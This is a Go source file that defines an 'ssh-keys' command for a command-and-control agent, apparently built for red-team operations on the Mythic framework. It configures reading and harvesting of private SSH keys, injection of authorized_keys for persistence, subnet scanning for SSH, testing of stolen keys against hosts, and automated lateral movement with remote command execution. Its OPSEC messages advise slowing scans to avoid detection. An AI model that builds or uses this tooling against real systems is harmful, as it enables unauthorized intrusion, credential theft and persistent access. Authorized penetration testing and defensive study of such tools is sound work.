package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "ssh-keys",
		Description:         "SSH key management and lateral movement automation. Read/inject authorized_keys (T1098.004), enumerate config/known_hosts, find reachable SSH hosts, test keys against targets, and auto-move across accessible hosts.",
		HelpString:          "ssh-keys -action <list|add|remove|read-private|enumerate|generate|find-reachable|try-keys|auto-move>\nssh-keys -action find-reachable -targets 192.168.1.0/24\nssh-keys -action try-keys -host 192.168.1.10 -username ubuntu\nssh-keys -action auto-move -targets 192.168.1.0/24 -username ubuntu -command id",
		Version:             1,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1098.004", "T1552.004", "T1552.002", "T1021.004", "T1046", "T1570"},
		ScriptOnlyCommand:   false,
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "sshkeys_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS, agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"list", "add", "remove", "read-private", "enumerate", "generate", "find-reachable", "try-keys", "auto-move"},
				Description:      "Action: list authorized_keys, add/remove a key, read private keys, enumerate SSH config/known_hosts, generate key pair, find-reachable (scan subnet for open SSH), try-keys (test private keys against a host), auto-move (chain scan→auth→exec)",
				DefaultValue:     "list",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "key",
				ModalDisplayName: "SSH Key",
				CLIName:          "key",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "SSH public key to add, or substring to match for removal",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:                 "user",
				ModalDisplayName:     "Target User",
				CLIName:              "user",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DynamicQueryFunction: getCallbackUserList,
				Description:          "Target user (default: current user). Reads their ~/.ssh/ directory.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "path",
				ModalDisplayName: "File Path",
				CLIName:          "path",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Override default path (e.g., /root/.ssh/authorized_keys). For try-keys: explicit private key file or directory.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "targets",
				ModalDisplayName: "Target Hosts",
				CLIName:          "targets",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Target host range for find-reachable / auto-move. Supports CIDR (192.168.1.0/24), comma-separated IPs, or dash ranges (192.168.1.1-254).",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "host",
				ModalDisplayName: "Target Host",
				CLIName:          "host",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Single target host for try-keys action.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "username",
				ModalDisplayName: "SSH Username",
				CLIName:          "username",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "SSH username for try-keys / auto-move (default: root).",
				DefaultValue:     "root",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "command",
				ModalDisplayName: "Remote Command",
				CLIName:          "command",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Command to run on each successfully accessed host in auto-move (default: id).",
				DefaultValue:     "id",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "port",
				ModalDisplayName: "SSH Port",
				CLIName:          "port",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "SSH port for find-reachable / try-keys / auto-move (default: 22).",
				DefaultValue:     22,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "delay_ms",
				ModalDisplayName: "Delay (ms)",
				CLIName:          "delay_ms",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Milliseconds to wait between authentication attempts (default: 500). Increase to avoid lockouts.",
				DefaultValue:     500,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: SSH key operation completed. SSH key reads generate file access logs. Key injection modifies authorized_keys — changes are visible via file integrity monitoring. Ensure cleanup of injected keys after use.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")

			if action == "enumerate" {
				createArtifact(processResponse.TaskData.Task.ID, "File Open",
					"SSH enumeration: config, known_hosts, authorized_keys, agent sockets (T1552.004)")
				return response
			}

			// Register successful try-keys / auto-move authentications as credentials
			if action == "try-keys" || action == "auto-move" {
				username, _ := processResponse.TaskData.Args.GetStringArg("username")
				if username == "" {
					username = "root"
				}
				var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
				for _, line := range strings.Split(responseText, "\n") {
					// Format: "[+] VALID  /path/to/key → user@host:port"
					if !strings.HasPrefix(line, "[+] VALID") {
						continue
					}
					// Extract key path and target from line
					parts := strings.SplitN(line, "→", 2)
					if len(parts) < 2 {
						continue
					}
					keyPath := strings.TrimSpace(strings.TrimPrefix(parts[0], "[+] VALID"))
					target := strings.TrimSpace(parts[1])
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: "key",
						Realm:          target,
						Account:        username,
						Credential:     keyPath,
						Comment:        fmt.Sprintf("ssh-keys %s: key authenticated", action),
					})
				}
				registerCredentials(processResponse.TaskData.Task.ID, creds)
				return response
			}

			if action != "read-private" && action != "generate" {
				return response
			}
			// Extract SSH private keys from read-private output
			// Format: "=== /path/to/key ===\n-----BEGIN ... KEY-----\n...\n-----END ... KEY-----"
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			sections := strings.Split(responseText, "=== ")
			for _, section := range sections {
				if !strings.Contains(section, "PRIVATE KEY") {
					continue
				}
				lines := strings.SplitN(section, "\n", 2)
				keyPath := strings.TrimSuffix(strings.TrimSpace(lines[0]), " ===")
				if len(lines) < 2 {
					continue
				}
				keyContent := strings.TrimSpace(lines[1])
				if keyContent == "" {
					continue
				}
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: "key",
					Realm:          hostname,
					Account:        keyPath,
					Credential:     keyContent,
					Comment:        "ssh-keys (read-private)",
				})
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			var msg string
			switch action {
			case "find-reachable":
				msg = "OPSEC WARNING: find-reachable sends TCP SYN packets to port 22 on each target host. Network scanning is logged by firewalls and network monitoring solutions. Use slow scanning (-delay_ms) to reduce detection."
			case "try-keys":
				targets, _ := taskData.Args.GetStringArg("host")
				msg = fmt.Sprintf("OPSEC WARNING: try-keys attempts SSH key authentication against %s. Each attempt appears in sshd auth.log on the target as an authentication event. Failed attempts generate 'Invalid user' or 'Authentication failure' log entries.", targets)
			case "auto-move":
				targets, _ := taskData.Args.GetStringArg("targets")
				msg = fmt.Sprintf("OPSEC WARNING: auto-move chains subnet scan → key auth → remote command against %s. Generates: network scan traffic, SSH authentication events (auth.log), and command execution logs on each accessed host.", targets)
			case "enumerate":
				msg = "OPSEC WARNING: Reading SSH keys and authorized_keys files (T1098.004, T1552.004). SSH key file access is monitored by file integrity monitoring and EDR. On Windows: also accesses PuTTY registry keys (HKCU\\Software\\SimonTatham\\PuTTY), WSL distribution registry, and cross-subsystem filesystem paths."
			default:
				msg = "OPSEC WARNING: Reading SSH keys and authorized_keys files (T1098.004, T1552.004). SSH key file access is monitored by file integrity monitoring and EDR. Modifying authorized_keys is a persistence indicator."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			var display string
			switch action {
			case "find-reachable":
				targets, _ := taskData.Args.GetStringArg("targets")
				display = fmt.Sprintf("find-reachable %s", targets)
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID: taskData.Task.ID, BaseArtifactType: "Network Activity",
					ArtifactMessage: fmt.Sprintf("TCP port 22 scan → %s", targets),
				})
			case "try-keys":
				host, _ := taskData.Args.GetStringArg("host")
				username, _ := taskData.Args.GetStringArg("username")
				if username == "" {
					username = "root"
				}
				display = fmt.Sprintf("try-keys %s@%s", username, host)
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID: taskData.Task.ID, BaseArtifactType: "Authentication",
					ArtifactMessage: fmt.Sprintf("SSH key auth attempts → %s@%s", username, host),
				})
			case "auto-move":
				targets, _ := taskData.Args.GetStringArg("targets")
				username, _ := taskData.Args.GetStringArg("username")
				command, _ := taskData.Args.GetStringArg("command")
				if username == "" {
					username = "root"
				}
				if command == "" {
					command = "id"
				}
				display = fmt.Sprintf("auto-move %s as %s: %q", targets, username, command)
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID: taskData.Task.ID, BaseArtifactType: "Network Activity",
					ArtifactMessage: fmt.Sprintf("SSH lateral movement: scan+auth+exec → %s (user: %s, cmd: %s)", targets, username, command),
				})
			default:
				display = action
				user, _ := taskData.Args.GetStringArg("user")
				if user != "" {
					display += fmt.Sprintf(" (%s)", user)
				}
			}
			response.DisplayParams = &display
			return response
		},
	})
}
